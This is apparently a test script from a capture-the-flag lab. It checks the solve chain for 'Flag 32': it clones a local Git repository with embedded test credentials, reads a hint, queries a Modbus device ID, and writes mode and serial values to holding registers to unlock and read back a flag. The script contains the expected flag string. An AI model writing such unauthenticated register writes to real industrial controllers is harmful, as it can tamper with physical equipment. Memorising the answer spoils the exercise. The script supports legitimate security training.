#!/bin/bash
# Chain test: Flag 32 — A7 manufacturing-orchestrator → A10 tail controller
#
# Path: Read deploy_combat_ai.yml from A7 → learn diagnostic mode 3 →
#       query A10 device ID for serial → write mode 3 → write serial → flag
#
# Requires: Gitea on :3000, A10 on $A10_PORT

set -e
A10_HOST="${A10_HOST:-127.0.0.1}"
A10_PORT="${A10_PORT:-5020}"

curl -sf http://localhost:3000/api/v1/version > /dev/null 2>&1 || exit 77
python3 -c "from pymodbus.client import ModbusTcpClient; c=ModbusTcpClient('$A10_HOST',port=$A10_PORT); exit(0 if c.connect() else 77); c.close()" || exit 77

python3 << 'PYEOF'
import subprocess, sys, os, tempfile, shutil

errors = []
def check(name, cond, detail=""):
    if not cond:
        errors.append(f"FAIL: {name} — {detail}")
        print(f"  FAIL: {name} — {detail}", file=sys.stderr)

HOST = os.environ.get("A10_HOST", "127.0.0.1")
PORT = int(os.environ.get("A10_PORT", "5020"))

# Step 1: Clone manufacturing-orchestrator from A7, find diagnostic mode hint
d = tempfile.mkdtemp()
subprocess.run(["git", "clone", "-q",
    "http://e_vasik:TestPass123!@localhost:3000/aurora/manufacturing-orchestrator.git", d],
    capture_output=True, check=True)
with open(os.path.join(d, "playbooks", "deploy_combat_ai.yml")) as f:
    playbook = f.read()
# Participant reads: "Diagnostic mode (register 20 = 3)" and "serial number to register 99"
check("playbook hints at mode 3", "register 20" in playbook and "3" in playbook)
check("playbook hints at serial to reg 99", "register 99" in playbook or "serial" in playbook.lower())
shutil.rmtree(d)

# Step 2: Query A10 device ID for serial info
from pymodbus.client import ModbusTcpClient
from pymodbus.pdu.mei_message import ReadDeviceInformationRequest
c = ModbusTcpClient(HOST, port=PORT)
c.connect()

# The serial (AHS-T-00482) gives us challenge value 482
# Participant extracts last 3 digits from serial
# For now, we verify the device ID returns useful info
rq = ReadDeviceInformationRequest(read_code=1)
resp = c.execute(False, rq)
has_vendor = hasattr(resp, "information") and resp.information
check("device ID returns vendor info", has_vendor)

# Step 3: Check if already unlocked, otherwise do the unlock
r = c.read_holding_registers(address=100, count=24)
already_unlocked = any(v > 0 for v in r.registers)

if not already_unlocked:
    c.write_register(address=20, value=3)
    c.write_register(address=99, value=482)
    import time; time.sleep(0.5)
    r = c.read_holding_registers(address=100, count=24)

flag = "".join(chr(v) for v in r.registers if v > 0)
check("flag 32 unlocked via A7 hint chain", flag == "FLAG{9b3e7c1d0f5a2846}", f"got: {flag!r}")
c.close()

if errors:
    for e in errors: print(f"  {e}", file=sys.stderr)
    sys.exit(1)
PYEOF
